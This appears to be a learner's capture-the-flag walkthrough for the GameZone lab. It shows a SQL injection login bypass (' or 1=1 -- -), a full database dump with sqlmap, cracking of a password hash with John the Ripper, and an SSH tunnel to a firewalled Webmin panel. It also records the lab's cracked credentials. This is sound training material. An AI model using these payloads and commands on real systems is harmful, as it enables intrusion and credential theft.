We deployed the machine and accessed its web server.

What is the name of the large cartoon avatar holding a sniper on the forum?
Agent 47         

==============================================================================================================================================================================================================================

OBTAINING ACCESS VIA SQLI

SQL is a standard language for storing, editing and retrieving data in databases. A query can look like so:

SELECT * FROM users WHERE username = :username AND password := password

In our GameZone machine, when you attempt to login, it will take your inputted values from your username and password, then insert them directly into the query above. If the query finds data, you'll be allowed to login otherwise it will display an error message.

Here is a potential place of vulnerability, as you can input your username as another SQL query. This will take the query write, place and execute it.

Lets use what we've learnt above, to manipulate the query and login without any legitimate credentials.

If we have our username as admin and our password as: ' or 1=1 -- - it will insert this into the query and authenticate our session.

The SQL query that now gets executed on the web server is as follows:

SELECT * FROM users WHERE username = admin AND password := ' or 1=1 -- -

The extra SQL we inputted as our password has changed the above query to break the initial query and proceed (with the admin user) if 1==1, then comment the rest of the query to stop it breaking.

GameZone doesn't have an admin user in the database, however you can still login without knowing any credentials using the inputted password data we used in the previous question.

Use ' or 1=1 -- - as your username and leave the password blank.

QUESTION 2 - When you've logged in, what page do you get redirected to?
portal.php

==============================================================================================================================================================================================================================
USING SQLMAP

SQLMap is a popular open-source, automatic SQL injection and database takeover tool.
There are many different types of SQL injection (boolean/time based, etc..) and SQLMap automates the whole process trying different techniques.

NOW WE ARE GOING TO DUMP THE ENTIRE DATABASE FOR GAMEZONE
Using the page we logged into earlier, we're going point SQLMap to the game review search feature.

First we need to intercept a request made to the search feature using BurpSuite.
Save this request into a text file. We can then pass this into SQLMap to use our authenticated user session:
sqlmap -r request.txt --dbms=mysql --dump

-r uses the intercepted request you saved earlier
--dbms tells SQLMap what type of database management system it is
--dump attempts to outputs the entire database




ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14    - password hash
agent47        - username
==============================================================================================================================================================================================================================
CRACKING PASSWORD HASH WITH JOHN THE RIPPER

SAVE HASH TO TXT FILE
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256

password = videogamer124

ssh agent47@10.10.47.238


user.txt found

==============================================================================================================================================================================================================================

EXPOSING SERVICES WITH REVERSE SSH TUNNELS

Reverse SSH port forwarding specifies that the given port on the remote server host is to be forwarded to the given host and port on the local side.

-L is a local tunnel (YOU <-- CLIENT). If a site was blocked, you can forward the traffic to a server you own and view it. 
For example, if imgur was blocked at work, you can do ssh -L 9000:imgur.com:80 user@example.com. Going to localhost:9000 on your machine, will load imgur traffic using your other server.

-R is a remote tunnel (YOU --> CLIENT). You forward your traffic to the other server for others to view. Similar to the example above, but in reverse.

WE WILL USE A TOOL CALLED ss TO INVESTIGATE SOCKETS RUNNING ON THE HOST
If we run ss -tulpn it will tell us what socket connections are running
Argument	Description
-t	Display TCP sockets
-u	Display UDP sockets
-l	Displays only listening sockets
-p	Shows the process using the socket
-n	Doesn't resolve service names
:
Netid  State      Recv-Q Send-Q Local Address:Port               Peer Address:Port              
udp    UNCONN     0      0         *:68                    *:*                  
udp    UNCONN     0      0         *:10000                 *:*                  
tcp    LISTEN     0      80     127.0.0.1:3306                  *:*                  
tcp    LISTEN     0      128       *:10000                 *:*                  
tcp    LISTEN     0      128       *:22                    *:*                  
tcp    LISTEN     0      128      :::80                   :::*                  
tcp    LISTEN     0      128      :::22                   :::*        

QUESTION - HOW MANY TCP SOCKETS ARE RUNNING? = 5

We can see that a service running on port 10000 is blocked via a firewall rule from the outside (we can see this from the IPtable list). However, Using an SSH Tunnel we can expose the port to us (locally)!

From our local machine, run ssh -L 10000:localhost:10000 <username>@<ip>

Once complete, in your browser type "localhost:10000" and you can access the newly-exposed webserver.
ssh -L 10000:localhost:10000 agent47@10.10.47.238

Will ask for password.

Then type localhost:10000 into your web browser

Login to the portal with your previous obtained credentials

QUESTION - WHAT IS THE NAME OF THE EXPOSED CMS? = webmin

QUESTION - WHAT IS THE CMS VERSION? = 1.580 


==============================================================================================================================================================================================================================

PRIVILEGE ESCALATION WITH METASPLOIT

Using the CMS dashboard version, use Metasploit to find a payload to execute against the machine.



